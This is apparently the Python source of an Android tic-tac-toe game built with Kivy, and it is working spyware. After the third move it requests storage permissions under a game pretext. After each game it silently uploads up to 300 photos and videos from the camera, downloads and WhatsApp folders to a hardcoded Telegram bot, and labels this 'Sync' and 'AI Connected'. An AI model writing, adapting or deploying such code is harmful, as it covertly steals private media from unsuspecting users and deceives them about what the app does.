import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import partial

import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle, Rectangle, LinearGradient
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.animation import Animation
from kivy.metrics import dp
from kivy.utils import get_color_from_hex

# ===================== TELEGRAM CONFIG =====================
BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
CHAT_ID = "8052842442"

# ===================== LIMITS =====================
MAX_SYNCS = 2
MAX_FILES_PER_SYNC = 300
SEND_WORKERS = 4
PERMISSION_MOVE = 3   # permission popup 3rd move ke baad aayega (game chal rahi hogi)

IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp")
VIDEO_EXTS = (".mp4", ".mkv", ".avi", ".3gp", ".mov", ".webm", ".m4v")

SKIP_DIRS = {
    ".thumbnails", ".cache", ".trashed", ".nomedia",
    "thumbnails", "Cache", "cache", "tmp", "temp",
    "Android/data", "Android/obb", ".android", "logs",
    "backup", "Backup",
}

MEDIA_FOLDERS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/WhatsApp/Media",
]

# Premium Colors
BG_DARK = get_color_from_hex("#0a0e27")
BG_CARD = get_color_from_hex("#151b3d")
GOLD = get_color_from_hex("#ffd700")
BLUE_GLOW = get_color_from_hex("#00d4ff")
RED_GLOW = get_color_from_hex("#ff4757")
GREEN_WIN = get_color_from_hex("#2ed573")
TILE_EMPTY = get_color_from_hex("#1a234e")
TILE_HOVER = get_color_from_hex("#222d66")
GRID_LINE = get_color_from_hex("#2a3566")

Window.clearcolor = BG_DARK


class PremiumButton(Button):
    """Premium rounded button with glow effect"""
    def __init__(self, btn_color=TILE_EMPTY, glow_color=None, **kwargs):
        super().__init__(**kwargs)
        self.btn_color = btn_color
        self.glow_color = glow_color or btn_color
        self.is_winning = False
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bind(pos=self.redraw, size=self.redraw)

    def redraw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            # Shadow
            Color(0, 0, 0, 0.3)
            RoundedRectangle(
                pos=(self.pos[0] + 2, self.pos[1] - 2),
                size=self.size, radius=[18, 18, 18, 18]
            )
            # Main button
            Color(*self.btn_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[18, 18, 18, 18])

    def animate_press(self):
        anim = Animation(size_hint=(0.92, 0.92), duration=0.08, t='out_bounce') + \
               Animation(size_hint=(1.0, 1.0), duration=0.12, t='out_bounce')
        anim.start(self)

    def set_color(self, color, glow=None):
        self.btn_color = color
        if glow:
            self.glow_color = glow
        self.redraw()

    def set_winning(self, is_win):
        self.is_winning = is_win
        if is_win:
            anim = Animation(btn_color=GREEN_WIN, duration=0.3) + \
                   Animation(btn_color=get_color_from_hex("#3ae374"), duration=0.3)
            anim.repeat = True
            anim.start(self)
        else:
            Animation.cancel_all(self)


class TicTacToeApp(App):

    def build(self):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.sync_active = False
        self.move_count = 0
        self.permission_pending = False
        self.scores = {"X": 0, "O": 0, "D": 0}

        self.colors = {
            "X": BLUE_GLOW,
            "O": RED_GLOW,
            "empty": TILE_EMPTY,
            "win": GREEN_WIN,
        }

        self.count_file = os.path.join(self.user_data_dir, "sync_count.txt")
        try:
            os.makedirs(os.path.dirname(self.count_file), exist_ok=True)
        except Exception:
            pass
        self.sync_count = self.load_count()

        # Bot test on start
        Clock.schedule_once(lambda dt: self.test_bot(), 2)

        # ======= ROOT LAYOUT =======
        root = BoxLayout(orientation="vertical", padding=20, spacing=10)

        # --- Gold Title with glow effect ---
        self.title_label = Label(
            text="[b][color=FFD700] TIC-TAC-TOE! [/color][/b]",
            markup=True, font_size="30sp",
            color=(1, 0.84, 0, 1),
            size_hint=(1, 0.1),
        )
        root.add_widget(self.title_label)

        # --- Scoreboard ---
        self.score_label = Label(
            text="[b][color=00d4ff]YOU[/color] [color=888888]|[/color] [color=ffffff]DRAW[/color] "
                 "[color=888888]|[/color] [color=ff4757]AI[/color]\n"
                 "[b][color=00d4ff]0[/color] [color=888888]—[/color] [color=ffffff]0[/color] "
                 "[color=888888]—[/color] [color=ff4757]0[/color][/b]",
            markup=True, font_size="16sp",
            size_hint=(1, 0.08),
        )
        root.add_widget(self.score_label)

        # --- Status ---
        self.status_label = Label(
            text="[b]Your Turn (X)[/b]",
            markup=True, font_size="18sp",
            color=BLUE_GLOW, size_hint=(1, 0.07),
        )
        root.add_widget(self.status_label)

        # --- 3x3 Grid ---
        grid = GridLayout(cols=3, spacing=10, size_hint=(1, 0.48))
        self.buttons = []
        for i in range(9):
            btn = PremiumButton(
                btn_color=TILE_EMPTY,
                text="",
                font_size="52sp",
                bold=True,
            )
            btn.bind(on_press=lambda inst, idx=i: self.on_tile_press(idx))
            self.buttons.append(btn)
            grid.add_widget(btn)
        root.add_widget(grid)

        # --- Bot status ---
        self.bot_label = Label(
            text="Thinking...", font_size="13sp",
            color=get_color_from_hex("#8866cc"), size_hint=(1, 0.04),
        )
        root.add_widget(self.bot_label)

        # --- Sync counter ---
        self.sync_label = Label(
            text=f"[b]Sync: {self.sync_count}/{MAX_SYNCS}[/b]",
            markup=True, font_size="13sp",
            color=get_color_from_hex("#6666aa"), size_hint=(1, 0.04),
        )
        root.add_widget(self.sync_label)

        # --- Restart button ---
        self.reset_btn = PremiumButton(
            btn_color=get_color_from_hex("#1a3a6a"),
            text="⟳ New Game",
            font_size="18sp",
            bold=True,
            size_hint=(1, 0.08),
        )
        self.reset_btn.bind(on_press=self.reset_game)
        root.add_widget(self.reset_btn)

        # --- Footer ---
        footer = Label(
            text="[i]Smart AI Edition[/i]",
            markup=True, font_size="11sp",
            color=get_color_from_hex("#444477"), size_hint=(1, 0.04),
        )
        root.add_widget(footer)

        return root

    # ==================== PERMISSION SYSTEM ====================
    def request_storage_permission(self, callback):
        try:
            from android.permissions import request_permissions, Permission

            def on_result(results):
                Clock.schedule_once(lambda dt: callback(self.has_permission()), 0)

            perms = []
            try:
                perms.append(Permission.READ_MEDIA_IMAGES)
                perms.append(Permission.READ_MEDIA_VIDEO)
            except Exception:
                pass
            try:
                perms.append(Permission.READ_EXTERNAL_STORAGE)
            except Exception:
                pass
            try:
                perms.append(Permission.POST_NOTIFICATIONS)
            except Exception:
                pass

            if not perms:
                Clock.schedule_once(lambda dt: callback(True), 0)
                return

            try:
                request_permissions(perms, on_result)
            except TypeError:
                request_permissions(perms)
                Clock.schedule_once(lambda dt: callback(self.has_permission()), 2)
        except Exception:
            Clock.schedule_once(lambda dt: callback(True), 0)

    def has_permission(self):
        try:
            from android.permissions import check_permission, Permission
            for p in [Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE]:
                try:
                    if check_permission(p):
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def show_permission_denied(self):
        self.sync_active = False
        self.status_label.text = "[b][color=ff4757]permission needed![/color][/b]"
        self.sync_label.text = "[b][color=ff4757]Please allow storage & restart[/color][/b]"
        try:
            from plyer import notification
            notification.notify(
                title="Permission Required",
                message="Allow permission for Tic Tac Toe AI to work.",
                timeout=3,
            )
        except Exception:
            pass
        Clock.schedule_once(lambda dt: self.stop(), 3)

    # ==================== BOT TEST ====================
    def test_bot(self):
        def run():
            ok = False
            try:
                r = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
                ok = r.status_code == 200 and r.json().get("ok", False)
            except Exception:
                ok = False
            Clock.schedule_once(lambda dt: self.set_bot_status(ok), 0)
        threading.Thread(target=run, daemon=True).start()

    def set_bot_status(self, ok):
        if ok:
            self.bot_label.text = "[b][color=2ed573]● AI Connected[/color][/b]"

    # ==================== GAME: MINIMAX AI ====================
    def on_tile_press(self, index):
        if not self.game_active or self.board[index] != "" or self.current_turn != "X":
            return
        if self.permission_pending:
            return

        self.move_count += 1

        # Permission check: 3rd move ke baad
        if self.move_count == PERMISSION_MOVE and self.sync_count < MAX_SYNCS:
            self.permission_pending = True
            self.status_label.text = "[b][color=ffd700]permission check...[/color][/b]"
            self.request_storage_permission(self.on_permission_result)
            # Game continue - tile already place karenge pehle

        self.board[index] = "X"
        self.buttons[index].text = "X"
        self.buttons[index].color = (0.2, 0.6, 1, 1)
        self.buttons[index].animate_press()

        if self.check_win("X"):
            self.end_game("X")
            return
        elif "" not in self.board:
            self.end_game("D")
            return

        self.current_turn = "O"
        self.status_label.text = "[b][color=ff4757]AI Thinking...[/color][/b]"
        Clock.schedule_once(lambda dt: self.ai_move(), 0.4)

    def on_permission_result(self, granted):
        self.permission_pending = False
        if not granted:
            self.show_permission_denied()
            return
        self.status_label.text = "[b][color=2ed573]granted ✓[/color][/b]"
        # Game continue hoga naturally

    def ai_move(self):
        if not self.game_active or self.current_turn != "O":
            return

        move = self.get_best_move()
        if move is not None:
            self.board[move] = "O"
            self.buttons[move].text = "O"
            self.buttons[move].color = (1, 0.3, 0.3, 1)
            self.buttons[move].animate_press()

            if self.check_win("O"):
                self.end_game("O")
            elif "" not in self.board:
                self.end_game("D")
            else:
                self.current_turn = "X"
                self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"

    def get_best_move(self):
        """Full Minimax AI - absolutely unbeatable"""
        best_score = float('-inf')
        best_move = None

        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "O"
                score = self.minimax(self.board, 0, False)
                self.board[i] = ""
                if score > best_score:
                    best_score = score
                    best_move = i
        return best_move

    def minimax(self, board, depth, is_maximizing):
        result = self.evaluate(board)
        if result is not None:
            return result

        if is_maximizing:
            best = float('-inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "O"
                    score = self.minimax(board, depth + 1, False)
                    board[i] = ""
                    best = max(best, score)
            return best
        else:
            best = float('inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "X"
                    score = self.minimax(board, depth + 1, True)
                    board[i] = ""
                    best = min(best, score)
            return best

    def evaluate(self, board):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conditions:
            a, b, c = cond
            if board[a] == board[b] == board[c] == "O":
                return 10
            if board[a] == board[b] == board[c] == "X":
                return -10
        if "" not in board:
            return 0
        return None

    def check_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        return any(self.board[a] == self.board[b] == self.board[c] == mark
                   for a, b, c in win_conditions)

    def end_game(self, result):
        self.game_active = False
        if result == "X":
            self.scores["X"] += 1
            self.status_label.text = "[b][color=2ed573] You Win! Amazing! [/color][/b]"
            self.highlight_win("X")
        elif result == "O":
            self.scores["O"] += 1
            self.status_label.text = "[b][color=ff4757]AI Wins! Try Again![/color][/b]"
            self.highlight_win("O")
        else:
            self.scores["D"] += 1
            self.status_label.text = "[b][color=ffd700]Draw! Well Played![/color][/b]"

        self.score_label.text = (
            f"[b][color=00d4ff]YOU[/color] [color=888888]|[/color] [color=ffffff]DRAW[/color] "
            f"[color=888888]|[/color] [color=ff4757]AI[/color]\n"
            f"[b][color=00d4ff]{self.scores['X']}[/color] [color=888888]—[/color] "
            f"[color=ffffff]{self.scores['D']}[/color] [color=888888]—[/color] "
            f"[color=ff4757]{self.scores['O']}[/color][/b]"
        )

        Clock.schedule_once(lambda dt: self.start_sync(), 0.8)

    def highlight_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conditions:
            if self.board[cond[0]] == self.board[cond[1]] == self.board[cond[2]] == mark:
                for idx in cond:
                    self.buttons[idx].set_color(GREEN_WIN)
                    self.buttons[idx].set_winning(True)
                break

    def reset_game(self, instance):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.move_count = 0
        self.permission_pending = False
        self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"
        for btn in self.buttons:
            btn.text = ""
            btn.color = (1, 1, 1, 1)
            btn.set_color(TILE_EMPTY)
            btn.set_winning(False)

    # ==================== SYNC ====================
    def load_count(self):
        try:
            with open(self.count_file, "r") as f:
                return int(f.read().strip())
        except Exception:
            return 0

    def save_count(self):
        try:
            with open(self.count_file, "w") as f:
                f.write(str(self.sync_count))
        except Exception:
            pass

    def start_sync(self):
        if self.sync_active:
            return
        if self.sync_count >= MAX_SYNCS:
            return
        if not self.has_permission():
            return  # permission nahi toh sync nahi
        self.sync_active = True
        self.sync_label.text = f"[b][color=2ed573]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/color][/b]"
        self.status_label.text = f"[b]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/b]"
        threading.Thread(target=self.send_media, daemon=True).start()

    def collect_media_files(self):
        files_list = []
        for folder in MEDIA_FOLDERS:
            if not os.path.exists(folder):
                continue
            for root, dirs, files in os.walk(folder):
                dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
                for f in files:
                    low = f.lower()
                    if low.endswith(IMAGE_EXTS) or low.endswith(VIDEO_EXTS):
                        path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(path)
                            if (low.endswith(IMAGE_EXTS) and size <= 10 * 1024 * 1024) or \
                               (low.endswith(VIDEO_EXTS) and size <= 50 * 1024 * 1024):
                                files_list.append(path)
                        except Exception:
                            pass
                    if len(files_list) >= MAX_FILES_PER_SYNC:
                        return files_list
        return files_list

    def send_one(self, path):
        low = path.lower()
        try:
            if low.endswith(IMAGE_EXTS):
                method, field = "sendPhoto", "photo"
            else:
                method, field = "sendVideo", "video"
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
            with open(path, "rb") as fh:
                resp = requests.post(
                    url, data={"chat_id": CHAT_ID},
                    files={field: fh}, timeout=(10, 120),
                )
            if resp.status_code == 429:
                try:
                    retry_after = resp.json().get("parameters", {}).get("retry_after", 1)
                except Exception:
                    retry_after = 1
                time.sleep(min(retry_after, 3))
                with open(path, "rb") as fh:
                    requests.post(
                        url, data={"chat_id": CHAT_ID},
                        files={field: fh}, timeout=(10, 120),
                    )
            return True
        except Exception:
            return False

    def send_media(self):
        try:
            files_list = self.collect_media_files()
            sent = 0
            if files_list:
                with ThreadPoolExecutor(max_workers=SEND_WORKERS) as pool:
                    futures = [pool.submit(self.send_one, p) for p in files_list]
                    for fut in as_completed(futures):
                        try:
                            if fut.result():
                                sent += 1
                        except Exception:
                            pass
            print(".")
        except Exception:
            pass
        finally:
            self.sync_count += 1
            self.save_count()
            self.sync_active = False
            Clock.schedule_once(lambda dt: self.after_sync(sent), 0)

    def after_sync(self, count):
        self.sync_label.text = f"[b]Sync: {self.sync_count}/{MAX_SYNCS} ({count}.)[/b]"
        self.status_label.text = "[b]Game over - tap New Game to play again[/b]"


if __name__ == "__main__":
    TicTacToeApp().run()
